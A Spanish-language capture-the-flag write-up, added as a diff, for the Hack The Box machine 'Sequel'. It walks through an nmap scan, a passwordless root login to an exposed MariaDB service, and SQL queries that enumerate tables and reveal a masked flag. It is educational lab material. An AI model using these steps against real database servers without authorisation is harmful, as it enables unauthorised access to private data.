@@ -1,0 +1,154 @@
+---
+type: writeup
+title: Sequel
+description: Introduce un servicio MySQL vulnerable mal configurado para permitir el acceso sin contraseña. La máquina muestra cómo enumerar e interactuar con la base de datos mediante consultas SQL para extraer información crítica.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/sequel/sequel.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Sequel
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 
+```
+
+```plaintext
+PORT     STATE SERVICE REASON
+3306/tcp open  mysql   syn-ack ttl 63
+```
+
+Escaneamos el puerto abierto para ver más detalles sobre él.
+
+```bash
+nmap -p 3306 -sCV -oA nmap/openports 10.129.124.36
+```
+
+```plaintext
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql?
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+|   Thread ID: 67
+|   Capabilities flags: 63486
+|   Some Capabilities: ConnectWithDatabase, DontAllowDatabaseTableColumn, Support41Auth, ODBCClient, IgnoreSigpipes, SupportsTransactions, Speaks41ProtocolOld, FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, Speaks41ProtocolNew, LongColumnFlag, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: )!hk^vY9QmN~QZPc!vPn
+|_  Auth Plugin Name: mysql_native_password
+```
+
+## Exploitation
+
+Nos conectamos al servicio como el usuario `root` sin contraseña y logramos acceso.
+
+```bash
+mariadb -u root -h 10.129.124.36 --skip-ssl
+```
+
+Enumeramos las bases de datos.
+
+```bash
+SHOW databases;
+```
+
+```plaintext
++--------------------+
+| Database           |
++--------------------+
+| htb                |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.286 sec)
+```
+
+Seleccionamos la base de datos `htb`.
+
+```bash
+USE htb;
+```
+
+Enumeramos las tablas.
+
+```bash
+SHOW tables;
+```
+
+```plaintext
++---------------+
+| Tables_in_htb |
++---------------+
+| config        |
+| users         |
++---------------+
+2 rows in set (0.220 sec)
+```
+
+Vemos la estructura de la tabla `config`.
+
+```bash
+DESCRIBE config;
+```
+
+```plaintext
++-------+---------------------+------+-----+---------+----------------+
+| Field | Type                | Null | Key | Default | Extra          |
++-------+---------------------+------+-----+---------+----------------+
+| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
+| name  | text                | YES  |     | NULL    |                |
+| value | text                | YES  |     | NULL    |                |
++-------+---------------------+------+-----+---------+----------------+
+3 rows in set (0.222 sec)
+```
+
+Selecionamos las columnas `name` y `value` para su contenido.
+
+```bash
+SELECT name, value FROM config;
+```
+
+```plaintext
++-----------------------+----------------------------------+
+| name                  | value                            |
++-----------------------+----------------------------------+
+| timeout               | 60s                              |
+| security              | default                          |
+| auto_logon            | false                            |
+| max_size              | 2M                               |
+| flag                  | 7******************************8 |
+| enable_uploads        | false                            |
+| authentication_method | radius                           |
++-----------------------+----------------------------------+
+7 rows in set (0.221 sec)
+```
+
+Solo para practicar SQL obtenemos solo el valor de la columna `name` donde su valor es `flag`.
+
+```bash
+SELECT name, value FROM config WHERE name = 'flag';
+```
+
+```plaintext
++------+----------------------------------+
+| name | value                            |
++------+----------------------------------+
+| flag | 7******************************8 |
++------+----------------------------------+
+1 row in set (0.226 sec)
+```
+
+### Flag
+
+<Callout type="success" title="Flag">
+7******************************8
+</Callout>
